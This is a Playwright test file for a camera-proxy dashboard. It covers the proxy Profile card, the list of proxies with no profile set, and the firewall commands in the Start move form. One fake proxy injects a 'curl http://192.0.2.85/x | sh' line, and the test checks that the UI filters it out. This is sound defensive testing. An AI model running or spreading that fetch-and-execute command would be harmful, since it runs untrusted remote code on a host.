import { expect, test, type Page, type TestInfo } from '@playwright/test';
import { BASE } from './env';
import { api, client, enroll, signIn, uniq } from './helpers';
import { makeProfile } from '../test-client/summaries';
import type { ProxyClient } from '../test-client/client';

// The proxy profile (proxy profile design §3): the Profile card, the dashboard's list of proxies without a set
// profile, and the firewall lines of the Start move form. Fake proxies report it in their heartbeats (RFC 5737).
test.beforeEach(async ({ context }) => signIn(context));
const running: ProxyClient[] = [];
test.afterEach(() => { for (const c of running.splice(0)) c.abort(); });

async function account(page: Page, info: TestInfo, base: string) {
  return api(page, 'POST', '/accounts', { name: uniq(info, base), displayName: 'Profiles' });
}
async function proxy(page: Page, accountId: string, name: string, displayName: string, profile?: () => unknown, extra: Record<string, unknown> = {}) {
  const px = await api(page, 'POST', `/accounts/${accountId}/proxies`, { name, displayName, runsOn: 'local-host', ...extra });
  const code = (await api(page, 'POST', `/accounts/${accountId}/proxies/${px.id}/enrollment-codes`, {})).code;
  const c = client(await enroll(BASE, code), undefined, { commands: { allow: ['move.send', 'move.receive'] }, ...(profile ? { profile } : {}) });
  c.start();
  running.push(c);
  return px as { id: string };
}

test('the Profile card shows what the proxy reports; an older proxy says it needs the update', async ({ page }, info) => {
  const acc = await account(page, info, 'pf');
  const een = await proxy(page, acc.id, 'een', 'een', () => {
    const p = makeProfile({ warnings: ['profile_ftp_ports'] });
    return { ...p, firewall: { ...p.firewall, lines: [...p.firewall.lines, 'curl http://192.0.2.85/x | sh'] } };
  });
  const old = await proxy(page, acc.id, 'old', 'Old proxy');
  await page.goto(`/#/accounts/${acc.id}/proxies/${een.id}`);
  const card = page.getByTestId('profile-card');
  await expect(card.getByTestId('profile-name')).toHaveText('een (N100, 1 TB)');
  await expect(card.getByTestId('profile-cameras')).toHaveText('1 of 3 cameras');
  await expect(card.getByTestId('profile-storage')).toHaveText('Budget 600 GB (set in the profile), 41 GB used; disk 1.0 TB, 880 GB free');
  await expect(card.getByTestId('profile-hardware')).toContainText('Intel N100, 4 cores, 16 GB memory; load 0.70, 48.5 °C');
  await expect(card.getByTestId('profile-ftp')).toHaveText('on, port 2121, passive 30000–30029');
  await expect(card.getByTestId('profile-warning-profile_ftp_ports')).toContainText('fewer ports than the profile needs');
  await expect(card.getByTestId('profile-firewall-lines')).toHaveText('sudo ufw allow from 192.0.2.85 to any port 2121 proto tcp\nsudo ufw allow from 192.0.2.85 to any port 30000:30029 proto tcp');
  await expect(card.getByTestId('profile-firewall-dropped')).toHaveText('1 unrecognised line not shown');
  await expect(card).not.toContainText('curl');
  await page.context().grantPermissions(['clipboard-read', 'clipboard-write']);
  await card.getByTestId('profile-firewall-copy').click();
  await expect(card.getByTestId('profile-firewall-copy')).toHaveText('Copied');
  expect(await page.evaluate(() => navigator.clipboard.readText())).toContain('sudo ufw allow from 192.0.2.85 to any port 30000:30029 proto tcp');
  await page.goto(`/#/accounts/${acc.id}/proxies/${old.id}`);
  await expect(page.getByTestId('live-state')).toContainText(/online/i);
  await expect(page.getByTestId('profile-none')).toHaveText('no profile reported (needs cam-proxy 2026.10.26 or later)');
});

test('the dashboard lists proxies whose profile is not set, with their home page', async ({ page }, info) => {
  const acc = await account(page, info, 'pd');
  // Proxy names are unique per test: the dashboard shows every account.
  const [pi, een, old] = [uniq(info, 'pi'), uniq(info, 'een'), uniq(info, 'old')];
  await proxy(page, acc.id, pi, 'Pi', () => makeProfile({ set: false, name: null, cameras: 1, held: 1, storageGB: null }), { adminUiUrl: 'http://192.0.2.6:8480/' });
  await proxy(page, acc.id, een, 'een', () => makeProfile());
  await proxy(page, acc.id, old, 'Old proxy');
  await page.goto('/#/');
  const box = page.getByTestId('dash-profile-unset');
  await expect(box.getByTestId(`dash-profile-unset-${pi}`)).toContainText("set its profile on the proxy's home page");
  await expect(box.getByTestId(`dash-profile-home-${pi}`)).toHaveAttribute('href', 'http://192.0.2.6:8480/');
  await expect(box.getByTestId(`dash-profile-unset-${een}`)).toHaveCount(0);
  await expect(box.getByTestId(`dash-profile-unset-${old}`)).toHaveCount(0);
});

test('Start move shows the firewall lines the target needs for the camera', async ({ page }, info) => {
  const acc = await account(page, info, 'pm');
  const src = await proxy(page, acc.id, 'mini', 'Mini PC');
  const tgt = await proxy(page, acc.id, 'een', 'een', () => makeProfile({ tool: 'nft', passive: { from: 30000, to: 30029 } }));
  const old = await proxy(page, acc.id, 'old', 'Old proxy');
  await api(page, 'POST', `/accounts/${acc.id}/cameras`, { camsId: 'porch', name: 'Porch', kind: 'camera', proxyId: src.id, proxyCameraId: 'cam1', host: '192.0.2.10:443' });
  await expect.poll(async () => (await api(page, 'GET', `/proxies/${tgt.id}/profile`)).profile !== null).toBe(true);
  await page.goto('/#/moves');
  await page.getByTestId('start-move-account').selectOption(acc.id);
  await page.getByTestId('start-move-source').selectOption(src.id);
  await page.getByTestId('start-move-target').selectOption(tgt.id);
  const fw = page.getByTestId('start-move-firewall');
  await expect(fw).toContainText('Run these on een first');
  await expect(fw.getByTestId('start-move-firewall-box-lines')).toHaveText(
    'sudo nft add rule inet filter input ip saddr 192.0.2.10 tcp dport 2121 accept\nsudo nft add rule inet filter input ip saddr 192.0.2.10 tcp dport 30000-30029 accept');
  await expect(fw.getByTestId('start-move-firewall-box-copy')).toBeVisible();
  await page.getByTestId('start-move-target').selectOption(old.id);
  await expect(page.getByTestId('start-move-firewall-none')).toHaveText('Old proxy: no profile reported (needs cam-proxy 2026.10.26 or later); check its firewall by hand.');
});
